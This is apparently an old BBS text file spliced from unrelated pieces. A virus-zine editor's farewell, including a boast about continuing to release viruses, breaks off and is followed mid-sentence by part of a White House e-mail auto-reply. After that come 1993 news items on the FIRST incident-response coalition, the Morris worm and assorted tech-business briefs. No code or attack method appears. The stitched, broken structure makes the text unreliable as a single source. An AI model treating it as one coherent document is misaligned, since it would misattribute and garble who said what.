                            Is This The End?
                            ++++++++++++++++

   Well, to be honest.  I'm kind of tired writing this magazine.  It's
   not like I hate it or anything, it's just too much pressure for one
   person to handle.  Decimator helped me out a bit with a few articals
   and such.  But still every time I do an issue it's me who does the
   marjority of the work.  It seems the magazine is bigger than I
   thought.  It seems to be on everybodys BBS from NY to California,
   from Canada to Europe.  The thing is I can't write this thing by
   myself anymore.  I work everyday from 2pm - 10pm and I will be going
   back to school next semester.  So I don't have time to handle all the
   things I do.  So in the long run the magazine suffers.  Anyway,
   unless people want to help out (mabey the reason is that I haven't
   really asked before) lemme know.  Contact me on Digital Warefare.
   The numbers in an artical in this issue somewhere I'm sure.  Anyway,
   fuck it, If people don't contribute soon this may well be the last
   issue of this rag ever.  So whatever happens in 1992, we shall see.
   So if this is it, later people.  My viruses will still be coming on
   strong as always...

still very much an experiment.

     Your message has been read, and we are keeping careful track
of all the mail we are receiving electronically.  We will be
trying out a number of response-based systems shortly, and I ask
for your patience as we move forward to integrate electronic mail
from the public into the White House.

     Again, on behalf of the President, thank you for your
message and for taking part in the White House electronic mail
project.

                                  Sincerely,

                        Marsha Scott, Deputy Assistant

RESPONSE GROUP FORMED TO HANDLE INTERNATIONAL COMPUTER AND NETWORK SECURITY
     PROBLEMS
Mainframe Computing      May 00, 1993   V. 6   NO. 5    p.  1

Government  and  private  organizations  in  North  America  and Europe are
joining  forces  to help combat and prevent the world's escalating computer
and network security problems.

Known  as  the   *Forum  of  Incident  Response  and  Security  Teams*,  or
FIRST,  the  coalition  brings  together  a  variety  of  computer security
incident  response  teams  from  the public and private sectors, as well as
from  universities.  FIRST  aims  to foster cooperation and coordination in
incident  prevention, to prompt rapid reaction to incidents, and to promote
information  sharing  among its members. FIRST currently includes more than
20  response  teams  and  liaisons  (see  attached  list  of  participating
organizations).

Participation  in  FIRST is voluntary, and member teams must fund their own
involvement.  One  of  FIRST's  chief  goals  is  to  expand  the number of
participating  incident  response teams and to foster increased cooperation
in incident response-related activities.

In  general,  a response team is set up to serve a defined constituency. In
many  cases,  a team serves a single organization's computer network users.
Other  teams are operated by computer vendors and deal primarily with their
specific  operating  systems.  Incident response teams generally augment an
organization's  overall  computer  security efforts by focusing on computer
security incidents.

The  FIRST  Secretariat  is  responsible  for  various  administrative  and
coordination activities. The National Institute of Standards and Technology
serves as the secretariat.

"Computer  security vulnerabilities associated with information technology,
such   as  malicious  abuse  or  viruses,  require  a  rapid,  skilled  and
coordinated  response  to  minimize  damage,"  said  Dennis  Steinauer, who
oversees  NIST's  participation  in  FIRST  and  chairs  the FIRST Steering
Committee.  "For  a  response  team  to  be  effective,  it must have rapid
communication  both  within  its  own  constituency and with other incident
response  teams.  That's  what FIRST aims to accomplish." FIRST members, he
said,  use  automatic  alerting mechanisms, electronic mail and a number of
other methods to achieve this rapid communication.

FIRST is working to achieve  several goals:

*  To boost cooperation among information technology users in the effective
prevention, detection and recovery from computer security incidents;

*  To  provide a means to alert and advise clients on potential threats and
emerging incident situations;

*  To  support  and  promote  the  actions  and activities of participating
incident response teams, including research and operational activities; and

*  To  simplify  and encourage the sharing of security-related information,
tools and techniques.

FIRST  membership has grown quickly from 11 original teams to more than 20.
Although   initial   membership  consisted  primarily  of  U.S.  government
organizations, membership of private-sector organizations, universities and
non-U.S.   organizations   is   growing.   Many   are  finding  that  FIRST
participation  offers  extensive  information  and  help  in  combating and
preventing  computer  security  incidents.  FIRST officials state, however,
that  members  are expected to participate actively in the forum. The FIRST
Secretariat  can  provide  information on establishing an incident response
capability  and  on  FIRST  membership.

COMPUTER SECURITY EXPERTS ON THE ALERT
BALTIMORE MORNING SUN (BS) - Monday, May 24, 1993
By: Steve Auerweck Staff Writer
Edition: Final  Section: Financial  Page: 12C


On  Nov. 2, 1988, Robert Morris, a Cornell University graduate student from
Arnold, set loose a "worm" that soon disabled thousands of computers on the
Internet, an enormous but loose conglomeration of computers nationwide.

   Not  long afterward, a group of computer security experts meeting at the
National Security Agency headquarters at Fort Meade to discuss the disaster
laid  the  groundwork  for  FIRST, the *Forum  of  Incident   Response  and
Security Teams.

   FIRST,  coordinated  out  of  the  National  Institute  of Standards and
Technology  offices  in  Gaithersburg,  is a coalition of computer security
response teams from both the public and private sectors.

   Dennis  Steinauer,  chairman  of the FIRST steering committee, describes
the need this way: "As more and more organizations get themselves hooked up
to  networks  .  .  .  the threat population has increased, or at least the
avenues of exposure."

   So  FIRST  now  brings  together a variety of outfits that might need to
respond  swiftly  to security threats. They range from teams at the Defense
Department  to  US Sprint, the Space Physics Analysis Network in France and
the Government Centre for Information Systems in the United Kingdom.

   The  idea  is to provide swift communication among members about current
or potential problems, such as computer viruses or virulent hackers.

   "We're  not  a  professional or educational organization," Mr. Steinauer
says. "This is an operational activity."

   Their  main  avenue  of  communication  is  the  Internet, but they also
learned  a  lesson  in  1988. "We have backup methods in place that we test
from time to time," Mr. Steinauer says, "including the telephone."

   FIRST  is  contemplating  staging "a fairly extensive drill"; it has not
yet been challenged by any major incidents.

COMPUTER SCIENCES LAB WINS DEFENSE CONTRACT

   Computer  Sciences  Corp.  learned  last  week that its Network Security
Integration  Laboratory,  located  near  Fort  Meade,  won a $19.9 million,
four-year  contract to provide information security services to the Defense
Department.

   The  laboratory  works with the National Computer Security Center, which
is  affiliated  with  the  NSA.  The  Anne Arundel lab averages 40 workers,
supported  by  another  60  at  CSC's Systems Engineering Division in Falls
Church, Va. No new positions are anticipated here.

   CSC,  headquartered  in  El  Segundo,  Calif., had received a $6 million
contract for the first phase of the project last October.

   Its  security laboratory evaluates encryption devices built for computer
networks,  telephones,  fax machines and the like, and helps users put them
to work in specific applications. It also tests security systems and builds
mock-ups for Defense Department projects.

DIGITAL OFFERS $5,000 TO BREAK V-CARD SYSTEM

   Digital  Enterprises  Inc.  of Gaithersburg has a challenge for hackers:
Break its anti-virus scheme and win $5,000.

   The  company  sells a hardware/software protection system called V-Card.
If  you  can  beat  the  machine at its headquarters -- no Trojan horses or
bombs allowed, the company says -- you'll win the prize.

   Enterprising hackers can call Digital at (301) 926-6937.

MICROPROSE GAMES HEADED FOR CD FORMATS

   Hunt  Valley's MicroProse Software Inc. has licensed several of its most
popular  game  titles  to  Capitol  Multimedia  Inc. for release in two new
mass-market  compact  disk  formats.  The  Washington company will develop,
market  and  distribute the games for CD-I (CD-Interactive) and Sony CD-ROM
XA machines.

   The  titles  covered  by  the  worldwide  pact  are Sid Meier's Pirates,
Railroad  Tycoon  and  Civilization, as well as Silent Service and Airborne
Ranger.

WAVERLY TO DISTRIBUTE DAROX VIDEODISCS

   Waverly   Inc.'s   Electronic  Media  Division  will  be  the  exclusive
distributor  of interactive videodiscs put out for nursing schools by Darox
Corp. of La Jolla, Calif.

   Darox  now  has  32  titles  for  health  professionals, with more being
developed.  They  join other Waverly products for medical instruction, such
as  the  Medi-Sim  computer-assisted  instruction  programs  and  a line of
videos.

MAGAZINE SEEKS COMPUTER NIGHTMARES

   Has  your computer driven you right to the edge? Are you ready to hire a
disgruntled postal worker to blast the thing to smithereens? Do you long to
fold, spindle and mutilate?

   Put  those  problems  on  paper  and  you  may  win a restful weekend in
California, courtesy of San Diego's ComputorEdge Magazine.

   Its  Computer  Dementia  Contest  seeks a 1,000-word essay on your worst
computer nightmare. The most horrid wins a weekend out West.

   "We  have  a  couple  hundred entries so far," said the magazine's Kevin
Leap.  "Some are pretty hilarious. There was a guy who got Doritos stuck in
the  keyboard and woke up the next morning with 220,000 pages of the letter
'E.' "

   Send entries to P.O. Box 83086, San Diego, Calif. 92138. The deadline is
July 31.
